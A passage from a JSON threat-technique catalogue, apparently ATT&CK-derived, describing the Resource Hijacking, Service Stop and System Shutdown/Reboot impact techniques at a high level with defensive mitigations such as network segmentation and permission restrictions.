          "content": "One common purpose for Resource Hijacking is to validate transactions of cryptocurrency networks and earn virtual currency. Adversaries may consume enough system resources to negatively impact and/or cause affected machines to become unresponsive. Servers and cloud-based systems are common targets because of the high potential for available resources, but user endpoint systems may also be compromised and used for Resource Hijacking and cryptocurrency mining. Containerized environments may also be targeted due to the ease of deployment via exposed APIs and the potential for scaling mining activities by deploying or compromising multiple containers within an environment or cluster."
        }
      ],
      [
        {
          "type": "text",
          "content": "Additionally, some cryptocurrency mining malware identify then kill off processes for competing malware to ensure it’s not competing for resources."
        }
      ],
      [
        {
          "type": "text",
          "content": "Adversaries may also use malware that leverages a system's network bandwidth as part of a botnet in order to facilitate Network Denial of Service campaigns and/or to seed malicious torrents. Alternatively, they may engage in proxyjacking by selling use of the victims' network bandwidth and IP address to proxyware services."
        }
      ]
    ],
    "mitigations": [
      {
        "type": "text",
        "content": "This type of attack technique cannot be easily mitigated with preventive controls since it is based on the abuse of system features."
      }
    ]
  },
  {
    "id": "T1489",
    "name": "Service Stop",
    "tactics": [{ "id": "TA0040", "name": "Impact" }],
    "subs": [],
    "version": "1.2",
    "description": [
      [
        {
          "type": "text",
          "content": "Adversaries may stop or disable services on a system to render those services unavailable to legitimate users. Stopping critical services or processes can inhibit or stop response to an incident or aid in the adversary's overall objectives to cause damage to the environment. "
        }
      ],
      [
        {
          "type": "text",
          "content": "Adversaries may accomplish this by disabling individual services of high importance to an organization, such as "
        },
        { "type": "code", "content": "MSExchangeIS" },
        {
          "type": "text",
          "content": ", which will make Exchange content inaccessible . In some cases, adversaries may stop or disable many or all services to render systems unusable. Services or processes may not allow for modification of their data stores while running. Adversaries may stop services or processes in order to conduct Data Destruction or Data Encrypted for Impact on the data stores of services like Exchange and SQL Server."
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1030",
        "name": "Network Segmentation",
        "description": [
          [
            {
              "type": "text",
              "content": "Operate intrusion detection, analysis, and response systems on a separate network from the production environment to lessen the chances that an adversary can see and interfere with critical response functions."
            }
          ]
        ]
      },
      {
        "id": "M1022",
        "name": "Restrict File and Directory Permissions",
        "description": [
          [
            {
              "type": "text",
              "content": "Ensure proper process and file permissions are in place to inhibit adversaries from disabling or interfering with critical services."
            }
          ]
        ]
      },
      {
        "id": "M1024",
        "name": "Restrict Registry Permissions",
        "description": [
          [
            {
              "type": "text",
              "content": "Ensure proper registry permissions are in place to inhibit adversaries from disabling or interfering with critical services."
            }
          ]
        ]
      },
      {
        "id": "M1018",
        "name": "User Account Management",
        "description": [
          [
            {
              "type": "text",
              "content": "Limit privileges of user accounts and groups so that only authorized administrators can interact with service changes and service configurations."
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1529",
    "name": "System Shutdown/Reboot",
    "tactics": [{ "id": "TA0040", "name": "Impact" }],
    "subs": [],
    "version": "1.3",
    "description": [
      [
        {
          "type": "text",
          "content": "Adversaries may shutdown/reboot systems to interrupt access to, or aid in the destruction of, those systems. Operating systems may contain commands to initiate a shutdown/reboot of a machine or network device. In some cases, these commands may also be used to initiate a shutdown/reboot of a remote computer or network device via Network Device CLI (e.g. "
        },
        { "type": "code", "content": "reload" },
        { "type": "text", "content": ")." }
      ],
      [
        {
          "type": "text",
          "content": "Shutting down or rebooting systems may disrupt access to computer resources for legitimate users while also impeding incident response/recovery."
        }
      ],
      [
        {
          "type": "text",
          "content": "Adversaries may attempt to shutdown/reboot a system after impacting it in other ways, such as Disk Structure Wipe or Inhibit System Recovery, to hasten the intended effects on system availability."
        }
      ]
    ],
    "mitigations": [
      {
        "type": "text",
        "content": "This type of attack technique cannot be easily mitigated with preventive controls since it is based on the abuse of system features."
      }
    ]
  }
]
